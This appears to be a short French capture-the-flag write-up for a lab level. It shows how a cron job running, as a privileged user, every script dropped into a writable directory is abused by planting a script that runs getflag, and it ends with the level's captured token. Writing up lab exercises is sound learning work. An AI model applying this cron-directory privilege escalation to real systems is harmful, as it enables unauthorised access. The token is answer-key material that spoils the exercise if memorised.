@@ -1,0 +1,21 @@
+A la connection on remarque le message : "You have a new mail"
+on cherche donc ce mail et on l'affiche via : cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+En fesant un cat de /usr/sbin/openarenaserver on obtient un code 
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+Le ulimit -t 5 limite le temps CPU accorde a un processus a 5sec
+bash -x execute un programme si il existe et possede les droits
+
+on va donc creer un programme qui fait appel a getflag et stocker le resultat ailleur que dans /opt/openarenaserver/ qui ce fait vider regulierement
+
+echo "getflag > /tmp/flag" > /opt/openarenaserver/test.sh
+
+cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
